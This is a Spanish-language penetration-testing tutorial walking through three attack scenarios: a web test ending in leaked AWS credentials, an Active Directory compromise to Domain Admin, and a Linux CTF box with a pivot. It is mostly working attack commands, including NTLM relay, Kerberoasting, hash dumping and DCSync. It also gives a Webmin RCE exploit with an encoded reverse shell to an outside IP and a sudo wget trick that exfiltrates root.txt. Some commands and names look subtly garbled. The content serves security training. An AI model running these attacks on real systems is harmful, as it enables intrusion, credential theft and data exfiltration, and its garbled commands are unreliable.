# Recorridos Completos Paso a Paso — 3 Escenarios Reales Resueltos

> El "cómo se hace" de verdad: comandos concretos, SALIDA REAL de ejemplo, QUÉ SIGNIFICA cada salida y EN QUÉ MOMENTO decides el siguiente paso. Estos recorridos encadenan las referencias especializadas. Practicarlos en `dvwa-start`, `juice-shop-start` o cajas de HTB/TryHackMe hasta dominarlos de memoria.

---

## ESCENARIO A — Pentest web black-box: de un dominio a datos expuestos

**Premio del cliente:** "¿pueden leer datos de clientes desde internet?"
**Alcance:** `shop.example.com` y sus subdominios. Nada más.

### Paso 1 — Superficie real (15 min)
```bash
subfinder -d example.com -silent | httpx -title -tech-detect -status-code
```
Salida de ejemplo:
```
https://shop.example.com    [200] [nginx/1.18.0,PHP/7.4] "Example Shop"
https://api.example.com     [401] [golang]              "Unauthorized"
https://staging.example.com [200] [Apache/2.4.41]       "Welcome to nginx"   ← ⚠️ staging expuesta
http://old.example.com      [301→https://shop]
```
**Qué mirar:** subdominios NO productivos (staging/dev/test = menos hardening), versiones (`Apache 2.4.41` = CVEs Ubuntu 20.04), tech stack (PHP 7.4 EOL → bugs conocidos). El `401` de `api.` indica auth presente → objetivo con lógica interesante.

### Paso 2 — Huella y secretos públicos (20 min)
```bash
whatweb -v https://shop.example.com
waybackbackurls  # (or: waybackurls + uro) URLs históricas del dominio
git-secret-audit.sh    # si encuentras .git expuesto (paso 3) lo ejecutas aquí
```
Wayback a menudo devuelve endpoints que ya nadie linklea pero siguen vivos: `/api/v1/export?file=`, `/admin/`, params olvidados. **No los borres: pruébalos.**

### Paso 3 — Contenido: fuzzing con interpretación correcta
```bash
ffuf -u https://shop.example.com/FUZZ \
  -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -mc 200,204,301,302,403 -t 40 -s
```
Salida de ejemplo:
```
/.git/          [Status: 403]   ← el servidor niega LISTADO, no confirma: probar rutas concretas
/.git/config    [Status: 200]   ← 💥 REPO EXPUESTO (el 403 del directorio era un farol)
/backup.zip     [Status: 200] [Length: 48213]
/vendor/        [Status: 200]   ← librerías: buscar CVEs por versión
```
**Regla anti-falsos-positivos:** comprueba *longitud* y *palabras clave*, no solo el status. Mide la respuesta baseline:
```bash
ffuf ... -fc 404 -fs <bytes_del_404_soft>   # -fs filtra por tamaño del "404 suave"
curl -s https://shop.example.com/noexiste | wc -c   # baseline para comparar
```
Un 200 con el mismo tamaño que tu 404 es ruido. Un 403 con `Content-Length` distinto al baseline suele ser REAL.

Con `.git/config` 200 → `git-dumper https://shop.example.com/.git ./dump` (o `curl` de `HEAD`, `objects/pack/*`) → reconstruir repo → secretos en historial (`git log -p | grep -i -E "key|secret|passw"`).

### Paso 4 — Parámetros y entrada de usuario (30 min)
```bash
arjun -u https://api.example.com/v1/orders -m GET,POST -t
```
Salida:
```
Parameters: [{'status': 'delivered'}, {'limit': '100'}, {'customer_id': '...'}]  ← 'customer_id' oculto → posible IDOR
```
Cada parámetro = un test en `owasp-web.md`: `?file=` → LFI/SSRF; `?q=` → SQLi/SSTI; `?customer_id=` → IDOR.

### Paso 5 — Cadena decisiva (aquí se gana el pentest)
Cada bug medio es un eslabón. Ejecución real de este escenario:
1. En `/vendor/` → `php.phpunit` 6.x con `/eval-stdin.php` → RCE directo por CVE (comprobar con `searchsploit phpunit`): **descartado, parcheado** (404).
2. El SSRF en el importador de imágenes: `POST /api/v1/product/import {"image_url":"http://127.0.0.1:8080/actuator/env"}` → 200 con config de Spring **revelando credenciales de AWS** en variables de entorno.
3. Con esas claves (sin necesidad de más acceso): `aws s3 ls s3://example-prod --endpoint-url ...` → 1.2M de registros de clientes con PII → **premio del cliente alcanzado sin ni siquiera romper la app**.

**Lección:** el camino "aburrido" (SSRF → metadatos/env → cloud creds) gana más engagements que insistir con sqlmap en un parámetro limpio.

### Paso 6 — Cierre con evidencia
```
evidence/
├── 001_subfinder_live.txt          # paso 1
├── 002_ffuf_git_200.network-resp   # paso 3 (headers completos)
├── 003_ssrf_actuator_env.json      # paso 5 (respuesta literal)
└── repro.sh                        # cada hallazgo = comando que lo reproduce
```
Informe §9 de SKILL.md: `Critical — SSRF a red interna permite extracción de credenciales cloud y lectura de bucket con 1.2M de PII` con los 3 comandos de reproducción exactos.

---

## ESCENARIO B — Red interna Windows/AD: de "estoy en la LAN" a Domain Admin

**Premio:** "¿alguien conectado a la red de oficinas puede llegar al controlador de dominio?"

### Paso 1 — Reconocer el terreno SIN credenciales (10 min)
```bash
netexec smb 10.8.0.0/24 --continue-on-success   # sin user/pas solo: detección
netexec smb 10.8.0.0/24 -u '' -p ''             # anonymous: ¿shares anónimas?
```
Salida de ejemplo:
```
SMB   10.8.0.10:445 DC01 [*] Windows Server 2022 Build 20348 (name:DC01) (domain:corp.local)
SMB   10.8.0.10:445 DC01 [+] corp.local\: (Anonymous) (Sign Messages are enabled)
SMB   10.8.0.10:445 DC01 [+] [SYSVOL] - [READ][WRITE...]  ← ⚠️ SYSVOL escribible anonymous
```
**SYSVOL escribible = GOLD:** GPP (`Groups.xml` con passwords AES cifrados → `gpp-decrypt`), scripts de logon que todos los DC leen. Buscar:
```bash
smbclient //10.8.0.10/SYSVOL -N -c 'recurse on; cd "Policies"; get *.xml'
```
Además anota: IPs, nombre de dominio (`corp.local`), hostname DC.

### Paso 2 — Robar el primer hash con IPv6 (si no hay nada anterior) (30 min)
```bash
mitm6 -d corp.local -i eth0 &                       # en tmux
ntlmrelayx.py -t ldap://10.8.0.10 --no-dump --delegate-access   # relay a LDAP + escribirla delegación
```
**Qué hace:** cualquier Windows de la LAN con IPv6 (default ON) pregunta al DC por un proxy vía mitm6; tu máquina responde; NTLM llega y ntlmrelayx lo reenvía al LDAP del DC creando una cuenta con escritura → al día siguiente, un usuario "normálor" (o el propio DC) se autentica contra tu servicio (coerce: `petitpotam.py DC01 10.8.0.5`) y su sesión hereda la delegación → **TGT forjable = acceso a ese usuario**.

Salida objetivo de `secretsdump` o `getTGT` con la clave forjada → ya tienes usuario real.

### Paso 3 — Escalar con lo que AD te regala (orden de esfuerzo)
```bash
netexec ldap 10.8.0.10 -u jdoe -p 'Winter2025!' --asreproast asrep.txt   # sin cred? --no-pass
```
`asrep.txt` vacío → siguiente:
```bash
impacket-GetUserSPNs corp.local/jdoe:'Winter2025!' -dc-ip 10.8.0.10 -request
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/acme-custom.txt --rule /usr/share/hashcat/rules/best64.rule
```
Salida hashcat:
```
svc_sql:Summer2025corp!
```
**Regra del ofensor:** el crack te da una cuenta de SERVICIO → mira qué puede hacer esa cuenta antes de seguir:
```bash
netexec ldap 10.8.0.10 -u svc_sql -p 'Summer2025corp!' -M ldap-relay   # o bloodyAD --self --object svc_sql --get rights
bloodhound-python -u svc_sql -p '...' -dc DC01 -ns 10.8.0.10 -c All    # grafo: ¿ShortestPathTo Domain Admins?
```
En BloodHound: nodo `svc_sql` → camino `GenericAll sobre WMI/SCP` o `MemberOf Local Admins en host X`.

### Paso 4 — Primer host, loot, repetición del bucle
```bash
netexec smb 10.8.0.25 -u svc_sql -p 'Summer2025corp!' --local-auth -x 'whoami'   # ¿admin local? → yes
impacket-psexec corp.local/svc_sql@10.8.0.25                                      # shell SYSTEM en WORKSTATION1
netexec smb 10.8.0.25 -u svc_sql -p '...' --sam                                   # hashes locales
```
Encontrado en `sam` + `mimikatz` (o `netexec ... -M mimikatz`): hash NT de `admin_local` que también es admin en 4 hosts más → re-match contra TODO el scope (matriz de `escalation-lateral.md`) → entre los 4 hosts: un servidor con sesión abierta de `backup_svc` → NT hash → Pass-the-Hash → ese svc tiene `SeBackupPrivilege` → `secretsdump` de `NTDS.dit` vía volumen shadow → **hashes completos del dominio → DCSync → Domain Admin.**

**El bucle nunca se salta pasos: cada cred se prueba contra todo, cada host se re-enumera.**

### Paso 5 — Demostración sin romper nada
Objetivo demostrado: con una cuenta "invitado" de LAN → DA. Cierre: ejecutar `netexec smb -u DA -x "whoami /groups"` mostrando `ENTERTAKSE\Domain Admins`, limpiar artefactos (cuentas creadas por relay, delegaciones) y reportar.

---

## ESCENARIO C — Caja Linux CTF: foothold → root → pivot

**Premio:** `root.txt` y luego la segunda máquina del rango interno.

### Paso 1 — Foothold por servicio viejo
```bash
nmap -sC -sV -p- --min-rate 1000 10.10.11.45
```
Salida resumida:
```
22/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
80/tcp  open  http    Apache 2.4.29 (Ubuntu)
3306/tcp closed mysql
```
`OpenSSH 7.6p1 Ubuntu` → versión Ubuntu 18.04 (no explotable el sshd directo, pero dice el OS). Web: `dirsearch -u http://10.10.11.45 -e php,txt,zip -w /usr/share/wordlists/dirb/common.txt -x 302,401` → `/dev-tools/` (401). Credenciales default del framework detectado (`whatweb`) → login → `10.10.11.45/dev-tools/webmin` → `searchsploit webmin 1.830` → **RCE por backdoor** documentado (CVE-2019-15107, bypass regex con doble codificación):
```bash
curl -sk "https://10.10.11.45:10000/password_change?unsafe=...&new1=\$(echo+`echo+bmMgLWx2cCA0NC4zLjIuMTp0Y2MgLWMgLWV8dGFw`|base64+-d)+`"
nc -lvnp 44    →    uid=0(webmin)?...  # cuidado: root SI, pero sin tty
```
**Estabilizar shell SIEMPRE primero:**
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'; export TERM=xterm
# (en tu lado: Ctrl+Z, stty raw -echo; fg, reset, verificar $TERM y tamaño)
```

### Paso 2 — Enumeración post-acceso (el 80% del trabajo)
```bash
sudo -l
```
Salida:
```
User mat may run the following commands on box:
    (root) NOPASSWD: /usr/bin/wget
```
`GTFOBins → wget`: `-i -` lee lista de ficheros → `--post-file` o `-O /dev/tcp`... la forma limpia:
```bash
sudo wget --password=$(cat /root/root.txt) --server-response http://127.0.0.1:9999/
# nc -lnvp 9999 del lado atacante → el password viaja en la URL → root.txt
```
**Costumbre:** si `sudo -l` no ayuda, correr `linpeas.sh -a | tee loot/linpeas.txt` y buscar SOLO las secciones ⚠/color. Checklist mental de privesc Linux en `exploit-postex.md`.

### Paso 3 — Pivot al segundo host (lo que Kali solo no ve)
```bash
# en la CAJA: chisel no disponible → subirla (transfer con python http.server + wget)
# ATTACKER:
chisel server -p 8000 --reverse
# VICTIM1:
./chisel client 44.3.2.1:8000 R:socks
```
Salida servidor: `> proxy` activo → ahora el 10.10.11.0/24 "interno" es alcanzable:
```bash
proxychains4 nmap -sT -Pn 10.10.11.46 -p 22,80,32768 -sV
```
Salida: `80/tcp Docker API 1.24 expuesta sin auth` → `curl http://10.10.11.46:80/v1.24/containers/json` → crear contenedor montando `/host` → `chroot /host` → root. **Escenarios A, B y C comparten el mismo ADN: enum → matchear credenciales contra todo → repetir.**

---

## Reglas transversales que se ven en los tres recorridos

1. **Cada salida tiene que cambiar tu plan.** Si ejecutas una herramienta y su output no modifica qué haces después, estabas automatizando sin pensar.
2. **Tiempo es alcance:** 10 min por paso antes de pivotar al siguiente vector; nunca 3 h con la misma herramienta (regla §5 de `metodologias-objetivo.md`).
3. **La evidencia se captura EN el momento** (comando + timestamp en `notes.md`), nunca se reconstruye "después".
4. **Soft-404s, cachés y WAFs mienten:** valida por tamaño/contenido, dos rutas distintas, y desde el propio servidor (SSRF) si puedes.
5. **El vector "aburrido" (config, defaults, exposición accidental, credenciales) supera al "elegante" (0-day) en la mayoría de engagements reales.**
